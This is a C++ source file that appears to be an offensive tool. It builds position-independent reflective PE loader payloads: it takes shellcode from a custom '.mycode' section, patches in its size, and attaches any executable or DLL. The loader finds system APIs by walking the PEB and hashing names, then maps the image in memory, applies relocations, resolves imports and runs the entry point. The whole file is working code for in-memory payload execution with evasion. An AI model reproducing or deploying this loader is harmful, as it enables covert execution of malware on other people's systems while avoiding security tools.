#include "PEReflact.h"

namespace
{
    bool GetSectionRangeByName(HMODULE hModule, const char* sectionName, uint8_t*& begin, uint8_t*& end)
    {
        begin = nullptr;
        end = nullptr;

        if (hModule == nullptr || sectionName == nullptr)
        {
            return false;
        }

        auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        {
            return false;
        }

        auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<uint8_t*>(hModule) + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE)
        {
            return false;
        }

        auto* sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec)
        {
            char name[9] = {};
            std::memcpy(name, sec->Name, 8);
            if (std::strcmp(name, sectionName) == 0)
            {
                begin = reinterpret_cast<uint8_t*>(hModule) + sec->VirtualAddress;
                end = begin + sec->Misc.VirtualSize;
                return true;
            }
        }

        return false;
    }

    uint32_t HotFixShellcodeOffset(uint8_t* shellcodeBegin, uint8_t* shellcodeEnd)
    {
        const uint32_t size = static_cast<uint32_t>(shellcodeEnd - shellcodeBegin);
        uint32_t* shellcodeSize = nullptr;

        for (uint8_t* address = reinterpret_cast<uint8_t*>(CallLoader); *address != 0xC3; ++address)
        {
            if (*reinterpret_cast<short*>(address) == 0x0548)
            {
                shellcodeSize = reinterpret_cast<uint32_t*>(address + 2);
            }
        }

        if (shellcodeSize == nullptr)
        {
            return 0;
        }

        *shellcodeSize = size;
        return size;
    }
}

namespace PEReflact
{
    bool BuildReflectPayload(const uint8_t* fileBuffer, size_t fileSize, std::unique_ptr<uint8_t[]>& outputBuffer, size_t& outputSize, std::wstring& message)
    {
        outputBuffer.reset();
        outputSize = 0;

        if (fileBuffer == nullptr || fileSize == 0)
        {
            message = L"Input file buffer is empty.";
            return false;
        }

        uint8_t* shellcodeBegin = nullptr;
        uint8_t* shellcodeEnd = nullptr;
        HMODULE currentModule = GetModuleHandleW(nullptr);

        if (!GetSectionRangeByName(currentModule, ".mycode", shellcodeBegin, shellcodeEnd))
        {
            message = L"Section .mycode not found.";
            return false;
        }

        const uint32_t shellcodeSize = HotFixShellcodeOffset(shellcodeBegin, shellcodeEnd);
        if (shellcodeSize == 0)
        {
            message = L"Shellcode size patch failed.";
            return false;
        }

        outputSize = shellcodeSize + fileSize;
        auto buffer = std::make_unique<uint8_t[]>(outputSize);
        std::memcpy(buffer.get(), shellcodeBegin, shellcodeSize);
        std::memcpy(buffer.get() + shellcodeSize, fileBuffer, fileSize);
        outputBuffer = std::move(buffer);

        std::wstringstream ss;
        ss << L"Reflect payload built"
           << L"; shellcode=0x" << std::hex << shellcodeSize
           << L"; file=0x" << fileSize
           << L"; total=0x" << outputSize;
        message = ss.str();
        return true;
    }

    bool BuildRawPayload(const uint8_t* fileBuffer, size_t fileSize, std::unique_ptr<uint8_t[]>& outputBuffer, size_t& outputSize, std::wstring& message)
    {
        outputBuffer.reset();
        outputSize = 0;

        if (fileBuffer == nullptr || fileSize == 0)
        {
            message = L"Input file buffer is empty.";
            return false;
        }

        outputSize = fileSize;
        auto buffer = std::make_unique<uint8_t[]>(fileSize);
        std::memcpy(buffer.get(), fileBuffer, fileSize);
        outputBuffer = std::move(buffer);

        std::wstringstream ss;
        ss << L"Raw payload built; size=0x" << std::hex << fileSize;
        message = ss.str();
        return true;
    }
}

#pragma code_seg(push, myseg, ".mycode")

void CallLoader()
{
    char* now = reinterpret_cast<char*>(CallLoader);
    Loader(now + 0x1312);
}

HMODULE FindModuleByPEB(unsigned int moduleHash)
{
    PTEB teb = reinterpret_cast<PTEB>(__readgsqword(0x30));
    PPEB peb = teb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA ldr = peb->Ldr;

    PLIST_ENTRY listHead = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY currentEntry = listHead->Flink;
    while (currentEntry != nullptr && currentEntry != listHead)
    {
        auto* entry = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry != nullptr && entry->FullDllName.Buffer != nullptr)
        {
            wchar_t* dllName = entry->FullDllName.Buffer;
            wchar_t* fileName = nullptr;

            for (wchar_t* temp = dllName; *temp != 0; ++temp)
            {
                if (*temp == L'\\')
                {
                    fileName = temp + 1;
                }
            }

            if (fileName == nullptr)
            {
                fileName = dllName;
            }

            unsigned int thisHash = 0;
            char* p = reinterpret_cast<char*>(fileName);
            while (*p != 0)
            {
                thisHash = ROL4(thisHash, 13);
                thisHash += (*p >= 'a' && *p <= 'z') ? (*p - 0x20) : *p;
                p += 2;
            }

            if (thisHash == moduleHash)
            {
                return reinterpret_cast<HMODULE>(entry->DllBase);
            }
        }

        currentEntry = currentEntry->Flink;
    }

    return nullptr;
}

FARPROC FindFuncByMODULE(HMODULE hModule, unsigned int funcHash)
{
    auto* ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(hModule) + reinterpret_cast<PIMAGE_DOS_HEADER>(hModule)->e_lfanew);
    auto* exportDirectory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<BYTE*>(hModule) + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD functionCount = exportDirectory->NumberOfNames;
    auto* functionNames = reinterpret_cast<DWORD*>(reinterpret_cast<BYTE*>(hModule) + exportDirectory->AddressOfNames);
    auto* functionAddresses = reinterpret_cast<DWORD*>(reinterpret_cast<BYTE*>(hModule) + exportDirectory->AddressOfFunctions);
    auto* functionOrdinals = reinterpret_cast<WORD*>(reinterpret_cast<BYTE*>(hModule) + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < functionCount; ++i)
    {
        char* functionName = reinterpret_cast<char*>(reinterpret_cast<BYTE*>(hModule) + functionNames[i]);
        unsigned int thisHash = 0;
        for (char* p = functionName; *p != 0; ++p)
        {
            thisHash = ROL4(thisHash, 13);
            thisHash += (*p >= 'a' && *p <= 'z') ? (*p - 0x20) : *p;
        }

        if (thisHash == funcHash)
        {
            return reinterpret_cast<FARPROC>(reinterpret_cast<BYTE*>(hModule) + functionAddresses[functionOrdinals[i]]);
        }
    }

    return nullptr;
}

int Loader(char* fileAddress)
{
    const unsigned int ntdllHash = 0xb4dae5e7;
    const unsigned int kernel32Hash = 0x45a266c9;
    const unsigned int kernelbaseHash = 0x7d33bb31;

    HMODULE ntdll = FindModuleByPEB(ntdllHash);
    HMODULE kernel32 = FindModuleByPEB(kernel32Hash);
    HMODULE kernelBase = FindModuleByPEB(kernelbaseHash);
    if (kernel32 == nullptr)
    {
        return 0;
    }

    using pGetProcAddress = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    using pLoadLibraryA = HMODULE(WINAPI*)(LPCSTR);
    using pVirtualAlloc = LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD);
    using pVirtualProtect = BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD);
    using pFlushInstructionCache = BOOL(WINAPI*)(HANDLE, LPCVOID, SIZE_T);
    using pGetSystemInfo = VOID(WINAPI*)(LPSYSTEM_INFO);
    using pGetCurrentProcess = HANDLE(WINAPI*)(VOID);
    using pRtlCopyMemory = VOID(*)(PVOID, const VOID*, SIZE_T);
    using pRtlZeroMemory = VOID(*)(PVOID, SIZE_T);

    pLoadLibraryA fLoadLibraryA = reinterpret_cast<pLoadLibraryA>(FindFuncByMODULE(kernel32, 0xb583c684));
    pVirtualAlloc fVirtualAlloc = reinterpret_cast<pVirtualAlloc>(FindFuncByMODULE(kernelBase, 0xe6959c02));
    pRtlCopyMemory fRtlCopyMemory = reinterpret_cast<pRtlCopyMemory>(FindFuncByMODULE(ntdll, 0xe8faf7ab));
    pRtlZeroMemory fRtlZeroMemory = reinterpret_cast<pRtlZeroMemory>(FindFuncByMODULE(ntdll, 0xfbd86dab));
    pGetSystemInfo fGetSystemInfo = reinterpret_cast<pGetSystemInfo>(FindFuncByMODULE(kernelBase, 0x4f70bfb1));
    pGetProcAddress fGetProcAddress = reinterpret_cast<pGetProcAddress>(FindFuncByMODULE(kernel32, 0x8ac5a822));
    pVirtualProtect fVirtualProtect = reinterpret_cast<pVirtualProtect>(FindFuncByMODULE(kernelBase, 0x13d67950));
    pGetCurrentProcess fGetCurrentProcess = reinterpret_cast<pGetCurrentProcess>(FindFuncByMODULE(kernel32, 0x271f59f0));
    pFlushInstructionCache fFlushInstructionCache = reinterpret_cast<pFlushInstructionCache>(FindFuncByMODULE(kernelBase, 0x3aa03770));

    if (!fLoadLibraryA || !fGetProcAddress || !fVirtualAlloc || !fRtlCopyMemory || !fRtlZeroMemory || !fGetSystemInfo || !fVirtualProtect || !fGetCurrentProcess || !fFlushInstructionCache)
    {
        return 0;
    }

    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(fileAddress);
    if (dos == nullptr || dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return 0;
    }

    auto* nt64 = reinterpret_cast<PIMAGE_NT_HEADERS64>(fileAddress + dos->e_lfanew);
    if (nt64->Signature != IMAGE_NT_SIGNATURE)
    {
        return 0;
    }

    if (nt64->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC && nt64->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        return 0;
    }

    const SIZE_T imageSize = static_cast<SIZE_T>(nt64->OptionalHeader.SizeOfImage);
    if (imageSize == 0)
    {
        return 0;
    }

    LPVOID allocation = fVirtualAlloc(nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocation == nullptr)
    {
        return 0;
    }

    fRtlZeroMemory(allocation, imageSize);

    const SIZE_T headersSize = nt64->OptionalHeader.SizeOfHeaders;
    if (headersSize != 0)
    {
        fRtlCopyMemory(allocation, fileAddress, headersSize);
    }

    auto* sec = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<LPBYTE>(&nt64->OptionalHeader) + nt64->FileHeader.SizeOfOptionalHeader);
    const WORD sectionCount = nt64->FileHeader.NumberOfSections;
    for (WORD i = 0; i < sectionCount; ++i, ++sec)
    {
        DWORD rawSize = sec->SizeOfRawData;
        DWORD virtualSize = sec->Misc.VirtualSize;
        DWORD copySize = rawSize;
        if (virtualSize != 0 && virtualSize < copySize)
        {
            copySize = virtualSize;
        }

        if (copySize != 0)
        {
            LPVOID src = reinterpret_cast<LPBYTE>(fileAddress) + sec->PointerToRawData;
            LPVOID dst = reinterpret_cast<LPBYTE>(allocation) + sec->VirtualAddress;
            fRtlCopyMemory(dst, src, copySize);
        }

        if (virtualSize > copySize)
        {
            LPVOID dst = reinterpret_cast<LPBYTE>(allocation) + sec->VirtualAddress + copySize;
            fRtlZeroMemory(dst, virtualSize - copySize);
        }
    }

    const ULONG_PTR imageBase = static_cast<ULONG_PTR>(nt64->OptionalHeader.ImageBase);
    const LONG_PTR delta = static_cast<LONG_PTR>(reinterpret_cast<ULONG_PTR>(allocation) - imageBase);

    DWORD relocVA = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD relocSize = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (relocVA != 0 && relocSize != 0 && delta != 0)
    {
        auto* baseReloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<LPBYTE>(allocation) + relocVA);
        DWORD processed = 0;
        while (processed < relocSize && baseReloc->SizeOfBlock != 0)
        {
            DWORD count = (baseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            auto* entries = reinterpret_cast<PWORD>(reinterpret_cast<LPBYTE>(baseReloc) + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < count; ++i)
            {
                WORD entry = entries[i];
                WORD type = entry >> 12;
                WORD offset = entry & 0x0FFF;
                ULONG_PTR patchAddress = reinterpret_cast<ULONG_PTR>(reinterpret_cast<LPBYTE>(allocation) + baseReloc->VirtualAddress + offset);

                if (type == IMAGE_REL_BASED_DIR64)
                {
                    ULONG_PTR value = 0;
                    fRtlCopyMemory(&value, reinterpret_cast<LPVOID>(patchAddress), sizeof(ULONG_PTR));
                    value += delta;
                    fRtlCopyMemory(reinterpret_cast<LPVOID>(patchAddress), &value, sizeof(ULONG_PTR));
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW)
                {
                    DWORD value32 = 0;
                    fRtlCopyMemory(&value32, reinterpret_cast<LPVOID>(patchAddress), sizeof(DWORD));
                    value32 = static_cast<DWORD>(static_cast<LONG_PTR>(value32) + delta);
                    fRtlCopyMemory(reinterpret_cast<LPVOID>(patchAddress), &value32, sizeof(DWORD));
                }
            }

            processed += baseReloc->SizeOfBlock;
            baseReloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<LPBYTE>(baseReloc) + baseReloc->SizeOfBlock);
        }
    }

    DWORD importVA = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importVA != 0)
    {
        auto* importDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<LPBYTE>(allocation) + importVA);
        while (importDescriptor->Name != 0)
        {
            char* dllName = reinterpret_cast<char*>(reinterpret_cast<LPBYTE>(allocation) + importDescriptor->Name);
            HMODULE module = fLoadLibraryA(dllName);
            if (module == nullptr)
            {
                return 0;
            }

            auto* iatAddress = reinterpret_cast<LPBYTE>(allocation) + importDescriptor->FirstThunk;
            auto* intAddress = reinterpret_cast<LPBYTE>(allocation) + (importDescriptor->OriginalFirstThunk ? importDescriptor->OriginalFirstThunk : importDescriptor->FirstThunk);

            SIZE_T thunkCount = 0;
            auto* check = reinterpret_cast<PULONG_PTR>(intAddress);
            while (*check != 0)
            {
                ++thunkCount;
                ++check;
            }

            DWORD oldProtect = 0;
            SIZE_T iatSize = thunkCount * sizeof(ULONG_PTR);
            fVirtualProtect(iatAddress, iatSize, PAGE_READWRITE, &oldProtect);

            for (SIZE_T i = 0; i < thunkCount; ++i)
            {
                ULONGLONG raw = reinterpret_cast<PIMAGE_THUNK_DATA64>(intAddress)[i].u1.AddressOfData;
                FARPROC proc = nullptr;
                if ((raw & IMAGE_ORDINAL_FLAG64) != 0)
                {
                    proc = fGetProcAddress(module, reinterpret_cast<LPCSTR>(IMAGE_ORDINAL64(raw)));
                }
                else
                {
                    auto* ibn = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<LPBYTE>(allocation) + static_cast<DWORD>(raw));
                    proc = fGetProcAddress(module, reinterpret_cast<LPCSTR>(ibn->Name));
                }

                fRtlCopyMemory(iatAddress + i * sizeof(ULONG_PTR), &proc, sizeof(ULONG_PTR));
            }

            fVirtualProtect(iatAddress, iatSize, oldProtect, &oldProtect);
            ++importDescriptor;
        }
    }


    SYSTEM_INFO systemInfo{};
    fGetSystemInfo(&systemInfo);
    SIZE_T pageSize = systemInfo.dwPageSize;

    sec = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<LPBYTE>(&nt64->OptionalHeader) + nt64->FileHeader.SizeOfOptionalHeader);
    for (WORD i = 0; i < sectionCount; ++i, ++sec)
    {
        DWORD protect = PAGE_NOACCESS;
        BOOL isExec = (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL isWrite = (sec->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        BOOL isRead = (sec->Characteristics & IMAGE_SCN_MEM_READ) != 0;

        if (isExec)
        {
            protect = isRead ? (isWrite ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ) : PAGE_EXECUTE;
        }
        else if (isRead)
        {
            protect = isWrite ? PAGE_READWRITE : PAGE_READONLY;
        }

        LPVOID sectionStart = reinterpret_cast<LPBYTE>(allocation) + sec->VirtualAddress;
        SIZE_T size = sec->Misc.VirtualSize;
        if (size == 0)
        {
            continue;
        }

        ULONG_PTR base = reinterpret_cast<ULONG_PTR>(sectionStart) & ~(pageSize - 1);
        SIZE_T length = (size + (reinterpret_cast<ULONG_PTR>(sectionStart) - base) + pageSize - 1) & ~(pageSize - 1);

        DWORD oldProtect = 0;
        fVirtualProtect(reinterpret_cast<LPVOID>(base), length, protect, &oldProtect);
    }

    fFlushInstructionCache(fGetCurrentProcess(), allocation, imageSize);

    DWORD entryRva = nt64->OptionalHeader.AddressOfEntryPoint;
    if (entryRva == 0)
    {
        return 1;
    }

    FARPROC entryPoint = reinterpret_cast<FARPROC>(reinterpret_cast<LPBYTE>(allocation) + entryRva);
    if ((nt64->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0)
    {
        using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        reinterpret_cast<DllMain_t>(entryPoint)(reinterpret_cast<HINSTANCE>(allocation), DLL_PROCESS_ATTACH, nullptr);
    }
    else
    {
        reinterpret_cast<void(*)()>(entryPoint)();
    }

    return 1;
}

#pragma code_seg(pop, myseg)

extern "C" {
    __declspec(selectany) char __mycode_end = 0;
}
